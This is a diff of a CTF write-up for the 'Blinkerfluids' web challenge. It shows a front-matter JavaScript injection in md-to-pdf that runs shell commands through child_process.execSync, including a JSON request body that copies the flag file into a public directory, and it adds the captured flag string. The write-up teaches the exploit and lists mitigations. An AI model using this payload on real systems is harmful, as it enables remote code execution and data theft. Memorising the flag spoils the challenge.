@@ -5,7 +5,9 @@ title: Blinkerfluids
 
 # [Cyber Apocalypse](index.md) - Web - Blinkerfluids
 
-*I did not have the foresight to save screenshots or the challenge description while the CTF was active*.
+
+![Blinkerfluids screenshot](web-blinkerfluids/screenshot-00.png)
+
 
 In this challenge, a web application allows the user to create a markdown based invoice, and it will convert it to PDF. 
 
@@ -57,23 +59,38 @@ The proof of concept code for this exploit tells me that if I give it the follow
 ```
 ---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RCE
 ```
-So, I used [Insomnia](https://insomnia.rest) to send the following request body directly to `http://challenge-ip-and-port/api/invoice/add`. I had to replace the double-quotes with single-quotes, from the proof of concept code.
+Just typing this into the website produces an error.
+
+![Blinkerfluids screenshot](web-blinkerfluids/screenshot-01.png)
+
+There is likely some sanitization code on the client-size (I didn't check), but I didn't see any on the API side when looking in the code, so lets try talking directly to the API.
+
+I used [Insomnia](https://insomnia.rest) to send the following request body directly to `http://challenge-ip-and-port/api/invoice/add`. I had to replace the double-quotes with single-quotes, from the proof of concept code.
 ```json
 {
-    "markdown_content" : "---jsn((require('child_process')).execSync('cat /flag > static/invoices/flag.txt'))n---RCE"
+    "markdown_content" : "---js\n((require('child_process')).execSync('cat /flag.txt > static/invoices/flag.txt'))\n---RCE"
 }
 ```
-And response I got back was:
+
+![Blinkerfluids screenshot](web-blinkerfluids/screenshot-02.png)
+
+The response I got back was:
 ```json
 {
     "message" : "Invoice saved successfully!"
 }
 ```
+
 Now all I needed to do was to visit `http://challenge-ip-and-port/static/flag.txt` to view the flag.
+
+```
+HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
+```
 
 I had originally tried to coax it into putting the flag data into the PDF, but realized I could just copy the file directly to a web-viewable directory and ignore the PDF.
 
 This exploit could have been thwarted by:
  - Updating md-to-pdf to version 5.0.0 or above
- - Sanitizing user input to only allow MarkDown
+ - Sanitizing user input in the API controller to only allow MarkDown
  - Running the app using a limited user account in the Docker container and setting proper permissions for sensitive files in the container.
+
